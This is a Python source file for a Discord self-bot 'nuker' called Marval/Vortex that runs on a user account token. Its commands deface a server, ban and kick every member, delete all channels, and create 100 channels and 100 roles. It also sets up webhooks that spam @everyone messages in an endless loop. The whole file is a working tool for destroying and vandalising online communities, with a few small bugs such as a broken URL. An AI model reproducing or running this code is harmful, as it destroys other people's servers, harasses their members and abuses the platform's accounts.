import discord
import time
from discord.ext import commands
from colorama import Fore, init 
import requests
import os 
import random

prefix = "$$"
channelnames = ["vortexop"]
velocrypt1 = "$$"
marval = commands.Bot(command_prefix=prefix, self_bot=True)
marval.remove_command('help')

@marval.event
async def on_connect():
 
  print(f'Not Vortex!!')
  
print(f'''{Fore.RED}

           
███╗░░░███╗░█████╗░██████╗░██╗░░░██╗░█████╗░██╗░░░░░
████╗░████║██╔══██╗██╔══██╗██║░░░██║██╔══██╗██║░░░░░
██╔████╔██║███████║██████╔╝╚██╗░██╔╝███████║██║░░░░░
██║╚██╔╝██║██╔══██║██╔══██╗░╚████╔╝░██╔══██║██║░░░░░
██║░╚═╝░██║██║░░██║██║░░██║░░╚██╔╝░░██║░░██║███████╗
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚══════╝
      
           {Fore.WHITE}VORTEX BABY! 

              {Fore.GREEN}Marval Nuker Connected!
           
            {Fore.WHITE}[+] Connected
              {Fore.WHITE}_________________    
                {Fore.WHITE}
                {Fore.WHITE}[-] Wizz
                  {Fore.WHITE}[-] Ban
                    {Fore.WHITE}[-] Kick
                     {Fore.WHITE}[-] Channels
                       {Fore.WHITE}[-] ChFuck
                                                                                               
                                                                               ''')


@marval.command()
async def help(ctx):
  await ctx.send("""```xml
<-----------------------------
𝘄𝗶𝘇𝘇 :- 𝘕𝘶𝘬𝘦𝘴 𝘛𝘩𝘦 𝘚𝘦𝘳𝘷𝘦𝘳.
𝗯𝗮𝗻 :- 𝘉𝘢𝘯 𝘈𝘭𝘭. 
𝗸𝗶𝗰𝗸 :- 𝘒𝘪𝘤𝘬 𝘈𝘭𝘭.
𝗰𝗵𝗮𝗻𝗻𝗲𝗹𝙨 :- 𝘊𝘳𝘦𝘢𝘵𝘦 𝘊𝘩𝘢𝘯𝘯𝘦𝘭𝘴.
𝗰𝗵𝗳𝘂𝗰𝗸 :- 𝘋𝘦𝘭𝘦𝘵𝘦 𝘊𝘩𝘢𝘯𝘯𝘦𝘭𝘴
------------------------------>
```""")

@marval.command(aliases=["trash", "wizz"])
async def destroy(ctx):
    try:
        await ctx.guild.edit(
            name="Wizzed By Vortex",
            description="vortex got no chill",
            reason="ripped by vortex",
            icon=None,
            banner=None)
    except:
        pass
    await ctx.send(f"{velocrypt1}chfuck")
    await ctx.reply(f"{velocrypt1}ban", mention_author=True)
    
    for _i in range(100):
        await ctx.guild.create_text_channel(name=f"{channelnames}")
    for _i in range(100):
        await ctx.guild.create_role(name=f"rolenames"())
error = velocrypt1
MESSAGE_CONTENTS = ['@everyone **VORTEX GOT NO CHILL**']
WEBHOOK_NAMES = ['WIZZED BY VORTEX', 'WIZZED BY VORTEX'] 

@marval.event
async def on_guild_channel_create(channel):
   webhook=await channel.create_webhook(name = random.choice(WEBHOOK_NAMES))  
   while True:  
     await webhook.send(random.choice(MESSAGE_CONTENTS), username=random.choice(WEBHOOK_NAMES))
     
format = "%a, %d %b %Y | %H:%M:%S %ZGMT"
  
@marval.command()
async def ban(ctx):
    await ctx.message.delete()
    await ctx.send("`Ban Starting...`")
    show_avatar = discord.Embed(

     color=ctx.author.color 
    )
    show_avatar.set_image(url='https://media.discordapp.net/attachments/1005111080898535444/1006428981660233778/1660021284820.png')
    await ctx.send(embed=show_avatar)
    for user in list(ctx.guild.members):
        try:
            await ctx.guild.ban(user)
            print (f"{user.name} has been banned from {ctx.guild.name}")
        except:
            print (f"{user.name} Failed To Ban! From {ctx.guild.name}")


@marval.command()
async def kick(ctx):
    await ctx.message.delete()
    await ctx.send("`Vortex runs you!... 🥀`")
    show_avatar = discord.Embed(

     color=ctx.author.color 
    )
    show_avatar.set_image(url='ttps://media.discordapp.net/attachments/1005111080898535444/1006428981660233778/1660021284820.png')
    await ctx.send(embed=show_avatar)
    for user in list(ctx.guild.members):
        try:
            await ctx.guild.kick(user)
            print (f"{user.name} has been kicked from {ctx.guild.name}")
        except:
            print (f"{user.name} Failed To Kick! From {ctx.guild.name}")


@marval.command()
async def channels(ctx):
  await ctx.message.delete()
  print(f"{Fore.RED} Deleting Channels...")
  for channel in ctx.guild.channels:
    await channel.delete()
  print(f"{Fore.WHITE}Creating Channels...")
  for i in range(100):
    await ctx.guild.create_text_channel(name=f'vortexop')
    print(f"{Fore.RED}Added {channel.name}")

@marval.command()
async def chfuck(ctx):
  await ctx.message.delete()
  print(f"{Fore.WHITE}Deleting Channels")
  for channel in ctx.guild.channels:
    await channel.delete()
  print(f"{Fore.RED} Deleted Channels")


token = os.environ.get('token')
marval.run(token, bot=False)
